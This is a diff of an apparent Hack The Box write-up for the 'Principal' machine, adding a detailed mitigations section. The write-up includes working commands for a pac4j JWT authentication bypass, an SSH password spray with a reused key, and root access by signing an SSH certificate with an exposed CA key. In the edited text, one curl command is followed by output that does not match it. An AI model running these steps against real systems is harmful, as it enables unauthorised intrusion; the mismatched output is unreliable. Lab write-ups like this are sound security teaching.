@@ -8,8 +8,7 @@ image:
   path: assets/img/principal/principal.png
   alt: HTB Principal
 ---
-
-### Attack Chain Overview
+### Executive Summary
 
 This writeup documents the exploitation of the Principal HTB machine, which demonstrates a critical attack chain involving multiple vulnerabilities:
 
@@ -18,20 +17,13 @@ This writeup documents the exploitation of the Principal HTB machine, which demo
 3. **Credential Reuse & SSH Access**: Leveraged exposed credentials to gain initial shell access as `svc-deploy` service account
 4. **Privilege Escalation via SSH Certificates**: Exploited misconfigured SSH certificate authentication to create valid root certificates and achieve privilege escalation
 
-The machine demonstrates the importance of:
-- Patching vulnerable authentication libraries
-- Protecting cryptographic keys and sensitive configuration
-- Implementing proper access controls on system files
-- Using unique credentials across systems
-- Monitoring and restricting SSH certificate issuance
-
 ---
 
 ### Reconnaissance
 
 #### Nmap Scan
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
 └─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan 
 
@@ -155,7 +147,7 @@ On port 22, SSH is running. SSH version 9.6p1 shows that the host OS maybe Ubunt
 
 Add hostname `principal.htb` to /etc/hosts
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
 └─$ echo "$ip  principal.htb" | sudo tee -a /etc/hosts
 ```
@@ -196,11 +188,13 @@ JWT (JSON Web Tokens) security typically employs two layers of protection:
 
 This allows attackers who possess the public key to forge valid authentication tokens for any user, including administrators.
 
-The application leaks the JWT claims and session management through `/static/js/app.js`.
+**Finding the Public Key:**
 
-```
+The server's public key is available at `/api/auth/jwks`. We can retrieve it using curl:
+
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
-└─$ curl -s http://principal.htb:8080/static/js/app.js | head -n 60
+└─$ curl -s http://principal.htb:8080/api/auth/jwks | jq
 /**
  * Principal Internal Platform - Client Application
  * Version: 1.2.0
@@ -239,51 +233,32 @@ const ROLES = {
 
 // Token management
 class TokenManager {
-   
-}
-```
-
-**Finding the Public Key:**
-
-The server's public key is available at `/api/auth/jwks`. We can retrieve it using curl
-
-```
-┌──(kali㉿kali)-[~/HTB/Linux/Principal]
-└─$ curl -s http://principal.htb:8080/api/auth/jwks | jq
-{
-  "keys": [
-    {
-      "kty": "RSA",
-      "e": "AQAB",
-      "kid": "enc-key-1",
-      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
+    static getToken() {
+        return sessionStorage.getItem('auth_token');
     }
-  ]
+
+    static setToken(token) {
+        sessionStorage.setItem('auth_token', token);
+    }
+
+    static clearToken() {
+        sessionStorage.removeItem('auth_token');
+    }
+
+    static isAuthenticated() {
+        return !!this.getToken();
+    }
+
+    static getAuthHeaders() {
+        const token = this.getToken();
+        return token ? { 'Authorization': `Bearer ${token}` } : {};
+    }
 }
 ```
 
-The application uses role-based access control with three privilege levels defined in JWT claims. 
-
-```
-const ROLES = {
-    ADMIN: 'ROLE_ADMIN',
-    MANAGER: 'ROLE_MANAGER',
-    USER: 'ROLE_USER'
-};
-```
+The application uses role-based access control with three privilege levels defined in JWT claims. The critical endpoint `/api/auth/jwks` exposes the server's public RSA key, which is necessary for the exploit.
 
 The application stores authentication tokens in browser session storage and transmits them via the `Authorization: Bearer` header for API requests.
-
-```
-static getToken() {
-  return sessionStorage.getItem('auth_token');
-}
-
-static getAuthHeaders() {
-  const token = this.getToken();
-  return token ? { 'Authorization': `Bearer ${token}` } : {};
-}
-```
 
 #### Exploiting CVE-2026-29000
 
@@ -294,7 +269,7 @@ To exploit this vulnerability, we need to:
 
 Here's a Python script that automates this exploitation:
 
-```
+```python
 #!/usr/bin/env python3
 """
 PoC for CVE-2026-29000 - pac4j JWT Authentication Bypass
@@ -426,7 +401,7 @@ if __name__ == "__main__":
 
 Execute the script to generate the forged authentication token: 
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
 └─$ python3 CVE-2026-29000.py http://principal.htb:8080/ --username admin --role ROLE_ADMIN
 ============================================================
@@ -484,7 +459,7 @@ The exposed `encryption_key` value `D3pl0y_$$H_Now42!` appears to be reused as a
 
 **Password Spray Results:**
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
 └─$ netexec ssh $ip -u users.txt -p 'D3pl0y_$$H_Now42!' --continue-on-success
 SSH         10.129.244.220  22     10.129.244.220   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
@@ -502,7 +477,7 @@ Success! The credentials `svc-deploy:D3pl0y_$$H_Now42!` are valid. The `svc-depl
 
 **SSH Access:**
 
-```
+```shell
 ┌──(kali㉿kali)-[~/HTB/Linux/Principal]
 └─$ sshpass -p 'D3pl0y_$$H_Now42!' ssh -o StrictHostKeyChecking=no svc-deploy@principal.htb  
 Warning: Permanently added 'principal.htb' (ED25519) to the list of known hosts.
@@ -518,7 +493,7 @@ svc-deploy@principal:~$ cat user.txt
 
 After gaining access as the `svc-deploy` service account, we can explore the system for privilege escalation paths. The SSH daemon configuration reveals that the system uses SSH certificate-based authentication for automated deployments.
 
-```
+```shell
 svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf 
 # Principal machine SSH configuration
 PubkeyAuthentication yes
@@ -548,7 +523,7 @@ This is more flexible than traditional public key authentication because:
 
 The configuration file references the CA keys in `/opt/principal/ssh/`. Let's check what files are accessible:
 
-```
+```shell
 svc-deploy@principal:~$ find /opt/principal/ssh/ -readable -type f 2>/dev/null
 /opt/principal/ssh/ca.pub
 /opt/principal/ssh/README.txt
@@ -557,7 +532,7 @@ svc-deploy@principal:~$ find /opt/principal/ssh/ -readable -type f 2>/dev/null
 
 Critically, the `svc-deploy` user can READ the CA private key (`/opt/principal/ssh/ca`). This is a severe security misconfiguration. The CA private key should only be readable by administrators or automated deployment systems with strict access controls.
 
-```
+```shell
 svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt
 CA keypair for SSH certificate automation.
 
@@ -582,7 +557,7 @@ Since we have read access to the CA private key, we can sign our own SSH certifi
 
 We create a new ED25519 key pair that will be used for root authentication:
 
-```
+```shell
 svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f root -C "root ssh key"
 Generating public/private ed25519 key pair.
 Enter passphrase (empty for no passphrase): 
@@ -609,7 +584,7 @@ The key's randomart image is:
 
 We use `ssh-keygen` with the `-s` flag to sign our public key using the CA's private key:
 
-```
+```shell
 svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca -I "root" -n root -V +52w root.pub         
 Signed user key root-cert.pub: id "root" serial 0 for root valid from 2026-05-22T10:38:00 to 2027-05-21T10:38:59
 ```
@@ -629,7 +604,7 @@ The most critical parameter is `-n root`. This tells the SSH server that this ce
 
 With the signed SSH certificate, we successfully authenticate as the `root` user on the system. 
 
-```
+```shell
 svc-deploy@principal:/tmp$ ssh -i root root@localhost
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
 
@@ -640,7 +615,276 @@ root@principal:~# cat root.txt
 ************6f239734898dc2400
 ```
 
+---
 
+## Mitigations & Recommendations
 
+### 1. Upgrade pac4j-jwt — Remediate CVE-2026-29000
 
+**Action:** Upgrade the pac4j-jwt library to version **6.3.3** or later (or 5.7.9+ / 4.5.9+ for older branches) immediately. CVE-2026-29000 is a critical authentication bypass (CVSS 9.8) that allows any attacker with the server's public RSA key to forge valid admin JWTs.
+
+```xml
+<!-- pom.xml — upgrade pac4j-jwt -->
+<dependency>
+    <groupId>org.pac4j</groupId>
+    <artifactId>pac4j-jwt</artifactId>
+    <version>6.3.3</version> <!-- Fixed version -->
+</dependency>
+```
+
+If upgrading is not immediately possible, implement an application-level workaround that explicitly rejects JWTs with `alg: none`:
+
+```java
+// Reject unsigned JWTs before passing to pac4j
+JWSAlgorithm alg = signedJWT.getHeader().getAlgorithm();
+if (alg.equals(JWSAlgorithm.NONE) || alg.getName().equalsIgnoreCase("none")) {
+    throw new AuthenticationException("Unsigned JWTs are not accepted");
+}
+```
+
+**Root Cause:** The pac4j-jwt 6.0.3 `JwtAuthenticator` failed to properly validate the signature algorithm after decrypting JWE tokens. When an attacker encrypted a JWT with `alg: none` (unsigned) using the server's public RSA key, the library accepted it as valid — bypassing authentication entirely and allowing forged admin claims.
+
+---
+
+### 2. Restrict JWKS Endpoint Access
+
+**Action:** The `/api/auth/jwks` endpoint exposes the server's public RSA key, which is required for clients to verify tokens but also enables attackers to craft valid JWE envelopes. Restrict this endpoint to authenticated users or trusted origins:
+
+```java
+// Spring Security — restrict JWKS to authenticated users only
+@Override
+protected void configure(HttpSecurity http) throws Exception {
+    http.authorizeRequests()
+        .antMatchers("/api/auth/login").permitAll()
+        .antMatchers("/api/auth/jwks").authenticated()  // Require auth for JWKS
+        .anyRequest().authenticated();
+}
+```
+
+Alternatively, if the JWKS must remain public (e.g., for federated authentication), implement rate limiting and monitoring on the endpoint to detect reconnaissance:
+
+```nginx
+# nginx — rate limit JWKS requests
+location /api/auth/jwks {
+    limit_req zone=jwks burst=5 nodelay;
+    proxy_pass http://localhost:8080;
+}
+```
+
+**Root Cause:** The JWKS endpoint was unauthenticated and publicly accessible, providing the RSA public key necessary for the CVE-2026-29000 exploit. While JWKS endpoints are commonly public in OAuth/OIDC flows, in this application the key was used for JWE encryption — meaning anyone with the public key could encrypt payloads that the server would decrypt and process.
+
+---
+
+### 3. Do Not Expose Encryption Keys in the Admin Dashboard
+
+**Action:** Remove the `encryption_key` from the Settings page. Sensitive cryptographic material should never be displayed in a web interface, regardless of the user's role:
+
+```java
+// Sanitize settings response — redact sensitive fields
+@GetMapping("/api/settings")
+public Map<String, Object> getSettings() {
+    Map<String, Object> settings = settingsService.getAll();
+    // Redact sensitive values
+    settings.put("encryption_key", "********");
+    settings.put("jwt_secret", "********");
+    settings.put("database_password", "********");
+    return settings;
+}
+```
+
+Store encryption keys in a dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager, or environment variables with restricted process access) rather than in the application database:
+
+```shell
+# Environment variable — accessible only to the application process
+export PRINCIPAL_ENCRYPTION_KEY="$(openssl rand -base64 32)"
+```
+
+**Root Cause:** The admin dashboard Settings tab displayed the `encryption_key` value (`D3pl0y_$$H_Now42!`) in plaintext. This key was reused as the SSH password for the `svc-deploy` account, enabling lateral movement from the web application to the host OS.
+
+---
+
+### 4. Eliminate Credential Reuse — Use Unique Passwords Per Service
+
+**Action:** Use unique, randomly generated credentials for each service boundary. The encryption key used in the web application must not be reused as an SSH password:
+
+- Use a password manager or secrets vault to generate and store unique credentials.
+- Implement SSH key-based authentication for service accounts and disable password-based SSH login.
+- Rotate credentials periodically and audit for reuse across systems.
+
+```shell
+# Disable SSH password authentication for service accounts
+# /etc/ssh/sshd_config.d/60-principal.conf
+Match User svc-deploy
+    PasswordAuthentication no
+    PubkeyAuthentication yes
+```
+
+**Root Cause:** The encryption key `D3pl0y_$$H_Now42!` exposed in the admin dashboard was reused as the SSH password for the `svc-deploy` account. This credential reuse allowed the attacker to pivot from web application admin access to OS-level shell access via SSH.
+
+---
+
+### 5. Restrict Access to the SSH CA Private Key
+
+**Action:** The CA private key at `/opt/principal/ssh/ca` must be readable **only** by root or a dedicated certificate-issuance service account — never by general service accounts:
+
+```shell
+# Fix CA private key permissions — root-only access
+chmod 600 /opt/principal/ssh/ca
+chown root:root /opt/principal/ssh/ca
+
+# Verify
+ls -la /opt/principal/ssh/ca
+# Should show: -rw------- root root ca
+```
+
+Consider moving the CA private key off the server entirely and issuing certificates through a dedicated, isolated signing service or hardware security module (HSM):
+
+```shell
+# Move CA operations to a separate signing host
+# The web/deployment server should NEVER have the CA private key
+scp /opt/principal/ssh/ca signing-host:/etc/ssh-ca/ca
+shred -u /opt/principal/ssh/ca  # Securely delete from the deployment server
+```
+
+**Root Cause:** The `svc-deploy` user had read access to the CA private key (`/opt/principal/ssh/ca`). With this key, the attacker signed their own SSH certificate with `-n root` as the principal, creating a valid certificate that the SSH daemon accepted for root login.
+
+---
+
+### 6. Restrict SSH Certificate Principals — Do Not Allow Root Certificates
+
+**Action:** Configure the SSH daemon to restrict which principals (usernames) can be used with certificate-based authentication. Use the `AuthorizedPrincipalsFile` directive to maintain an explicit allowlist:
+
+```shell
+# /etc/ssh/sshd_config.d/60-principal.conf
+TrustedUserCAKeys /opt/principal/ssh/ca.pub
+AuthorizedPrincipalsFile /etc/ssh/auth_principals/%u
+
+# Create principal allowlists per user
+echo "svc-deploy" > /etc/ssh/auth_principals/svc-deploy
+# Do NOT create /etc/ssh/auth_principals/root — blocks root cert auth
+```
+
+Without `AuthorizedPrincipalsFile`, any certificate signed by the trusted CA with `-n root` as a principal is accepted for root login. The allowlist ensures that only explicitly approved principal names are valid for each user account.
+
+Additionally, restrict `PermitRootLogin` to block certificate-based root access entirely:
+
+```shell
+# /etc/ssh/sshd_config.d/60-principal.conf
+PermitRootLogin no   # Blocks ALL root login, including certificates
+```
+
+**Root Cause:** The SSH configuration used `TrustedUserCAKeys` without `AuthorizedPrincipalsFile`. This meant any certificate signed by the CA — regardless of the principal specified — was accepted for the corresponding user. The attacker signed a certificate with `-n root` and authenticated as root directly.
+
+---
+
+### 7. Implement Certificate Issuance Controls — Short-Lived Certificates and Audit Logging
+
+**Action:** The `deploy.sh` script referenced in `/opt/principal/ssh/README.txt` should enforce constraints on certificate issuance:
+
+- **Short validity periods** — Issue certificates valid for hours, not weeks. The exploit used `-V +52w` (one year).
+- **Restrict principals** — The signing script should only allow certificates for `svc-deploy`, never for `root` or other privileged accounts.
+- **Audit logging** — Log every certificate issuance event, including the requester, principal, validity period, and key fingerprint.
+
+```bash
+#!/bin/bash
+# deploy.sh — hardened certificate issuance
+ALLOWED_PRINCIPALS=("svc-deploy")
+MAX_VALIDITY="1h"
+
+principal="$1"
+pubkey="$2"
+
+# Validate principal against allowlist
+if [[ ! " ${ALLOWED_PRINCIPALS[@]} " =~ " ${principal} " ]]; then
+    echo "ERROR: Principal '${principal}' is not in the allowlist."
+    exit 1
+fi
+
+# Sign with short validity and restricted principal
+ssh-keygen -s /opt/principal/ssh/ca \
+    -I "deploy-$(date +%s)" \
+    -n "${principal}" \
+    -V "+${MAX_VALIDITY}" \
+    "${pubkey}"
+
+# Audit log
+logger -t ssh-ca "Certificate issued: principal=${principal}, key=$(ssh-keygen -lf ${pubkey})"
+```
+
+**Root Cause:** There were no controls on certificate issuance. The `svc-deploy` user could sign certificates for any principal (`-n root`), with any validity period (`-V +52w`), using the CA private key directly. No audit trail was generated.
+
+---
+
+### 8. Harden the Jetty Web Server — Remove Verbose Headers
+
+**Action:** Remove the `X-Powered-By: pac4j-jwt/6.0.3` response header. This header discloses the exact authentication library and version, enabling attackers to immediately search for known CVEs:
+
+```java
+// Jetty — remove X-Powered-By header
+@Bean
+public ConfigurableServletWebServerFactory webServerFactory() {
+    JettyServletWebServerFactory factory = new JettyServletWebServerFactory();
+    factory.addServerCustomizers(server -> {
+        for (Connector connector : server.getConnectors()) {
+            for (ConnectionFactory connectionFactory : connector.getConnectionFactories()) {
+                if (connectionFactory instanceof HttpConnectionFactory) {
+                    ((HttpConnectionFactory) connectionFactory)
+                        .getHttpConfiguration()
+                        .setSendServerVersion(false);
+                }
+            }
+        }
+    });
+    return factory;
+}
+```
+
+**Root Cause:** The `X-Powered-By: pac4j-jwt/6.0.3` header immediately revealed the authentication library and its exact version to any unauthenticated attacker. This information directly led to the discovery of CVE-2026-29000 through vulnerability research.
+
+---
+
+### 9. Implement JWT Algorithm Allowlisting
+
+**Action:** Even after patching CVE-2026-29000, configure the JWT authenticator to explicitly allowlist only the expected signing algorithms. Reject `none`, `HS256` (when RSA is expected), and any other unexpected algorithms:
+
+```java
+// pac4j — strict algorithm configuration
+JwtAuthenticator authenticator = new JwtAuthenticator();
+
+// Only accept RS256-signed JWTs — reject all others including 'none'
+RSASignatureConfiguration sigConfig = new RSASignatureConfiguration(rsaKeyPair);
+sigConfig.setAlgorithm(JWSAlgorithm.RS256);
+authenticator.addSignatureConfiguration(sigConfig);
+
+// Explicitly set encryption configuration
+EncryptionConfiguration encConfig = new RSAEncryptionConfiguration(rsaKeyPair);
+encConfig.setAlgorithm(JWEAlgorithm.RSA_OAEP_256);
+encConfig.setMethod(EncryptionMethod.A128GCM);
+authenticator.addEncryptionConfiguration(encConfig);
+```
+
+**Root Cause:** The JWT authenticator accepted `alg: none` as a valid signature algorithm. Defence-in-depth requires explicitly allowlisting only expected algorithms, preventing algorithm confusion attacks even if the library has undiscovered vulnerabilities.
+
+---
+
+### 10. Monitor for Anomalous SSH Certificate Usage
+
+**Action:** Enable SSH audit logging and monitor for certificate-based logins, especially for privileged accounts:
+
+```shell
+# /etc/ssh/sshd_config.d/60-principal.conf
+LogLevel VERBOSE
+
+# Monitor for certificate-based root logins
+# /etc/rsyslog.d/ssh-cert-monitor.conf
+:msg, contains, "Accepted certificate" /var/log/ssh-cert-auth.log
+```
+
+Set up alerts for:
+- Any certificate-based login to the `root` account.
+- Certificates with unusually long validity periods (> 24 hours for automated deployments).
+- Certificate issuance events from unexpected source accounts.
+- Multiple certificates signed in rapid succession (indicative of exploitation).
+
+**Root Cause:** The attacker signed and used a root SSH certificate without triggering any alerts. Certificate-based authentication events were not monitored separately from standard SSH logins, making the privilege escalation invisible to administrators.
 
